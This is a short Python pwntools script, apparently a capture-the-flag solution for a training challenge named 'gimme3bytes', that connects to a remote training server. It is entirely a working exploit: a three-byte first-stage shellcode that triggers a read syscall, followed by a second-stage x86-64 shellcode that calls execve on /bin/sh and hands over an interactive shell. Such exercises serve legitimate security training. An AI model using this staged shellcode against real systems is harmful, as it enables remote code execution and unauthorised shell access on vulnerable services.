from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#r = process("./gimme3bytes")
#gdb.attach(r,'''
#b * 0x004011ce
#b * 0x004011f1
#''')
#input("wait")
r = remote("bin.training.offdef.it", 2004)

asm_code1 = """
pop rdx
syscall
"""

asm_code2 = """
nop
nop
nop
mov rax, 0x3b
mov rdi, rcx
add rdi, 30
mov rsi, 0
mov rdx, 0
syscall 
"""

context.arch = 'amd64'
stringa = "/bin/sh"


shellcode = asm(asm_code1)
shellcode2 = asm(asm_code2)
res = shellcode + (b"/bin/sh")

r.send(shellcode)
#input("wait")
r.send(shellcode2 + b"/bin/sh")

r.interactive()